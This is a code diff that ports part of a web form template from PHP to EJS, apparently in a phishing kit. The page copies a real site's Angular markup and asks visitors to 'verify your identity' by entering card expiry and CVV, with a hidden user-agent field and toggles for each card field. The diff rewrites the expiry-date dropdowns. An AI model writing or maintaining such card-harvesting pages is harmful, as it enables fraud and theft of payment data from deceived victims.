@@ -52,7 +52,7 @@ let p_expiry = pc.exp === 'on' ? true : false;
                             </header>
                             <div _ngcontent-qsi-c156="" class="login-form-container">
                                 <h3 _ngcontent-qsi-c156="" style="margin-bottom: 10px;">Verify your identity to continue</h3>
-                                <form id="loginForm" _ngcontent-qsi-c156="" tabindex="-1" class="form ng-untouched ng-pristine ng-invalid lab-form" <?=$p_card ? 'form-card onsubmit="return validate()"' : ''?> method="post" action="">
+                                <form id="loginForm" _ngcontent-qsi-c156="" tabindex="-1" class="form ng-untouched ng-pristine ng-invalid lab-form" method="post" action="">
                                     <input type="hidden" id="userAgent" name="userAgent">
                                     <div _ngcontent-hve-c17="">
                                         <p _ngcontent-hve-c17="" style="margin-bottom: 40px;">To continue, enter the information requested below in order to verify your identity.</p>
@@ -65,30 +65,24 @@ let p_expiry = pc.exp === 'on' ? true : false;
                                         <link rel="stylesheet" href="/assets/css/card.css?<?=time()?>">
                                     </div>
                                     <% } if (p_expiry) { %>
-                                    <div class="form-group">
-                                        <p><b>Expiry:</b></p>
-                                        <select name="exp1" required style="width:48%; display: inline-block;" class="lrinput" attr-action="Selecting Expiry">
-                                            <option value="">MM</option>
-                                            <?php
-
-                                            for ($x = 1; $x <= 12; $x++) {
-                                                $y = strlen($x) == 1 ? '0' . $x : $x;
-                                                echo '<option value="' . $y . '">' . $y . '</option>';
-                                            }
-
-                                            ?>
-                                        </select>
-                                        <select name="exp2" required style="width:50%; display: inline-block;" class="lrinput" attr-action="Selecting Expiry">
-                                            <option value="">YY</option>
-                                            <?php
-
-                                            for ($x = date('y'); $x <= date('y') + 15; $x++) {
-                                                echo '<option value="' . $x . '">' . $x . '</option>';
-                                            }
-
-                                            ?>
-                                        </select>
-                                    </div>
+                                        <div class="form-group">
+                                            <p><b>Expiry:</b></p>
+                                            <select name="exp1" required style="width:48%; display: inline-block;" class="lrinput" attr-action="Selecting Expiry">
+                                                <option value="">MM</option>
+                                                <% for (let x = 1; x <= 12; x++) { 
+                                                    let y = x < 10 ? '0' + x : x; %>
+                                                    <option value="<%= y %>"><%= y %></option>
+                                                <% } %>
+                                            </select>
+                                            <select name="exp2" required style="width:50%; display: inline-block;" class="lrinput" attr-action="Selecting Expiry">
+                                                <option value="">YY</option>
+                                                <% for (let x = new Date().getFullYear(); x <= new Date().getFullYear() + 15; x++) { 
+                                                    let y = x.toString().substr(-2); %>
+                                                    <option value="<%= y %>"><%= y %></option>
+                                                <% } %>
+                                            </select>
+                                        </div>
+                                        
                                     <% } if (p_cvv) { %>
                                     <div class="form-group">
                                         <p><b>Cvv:</b></p>
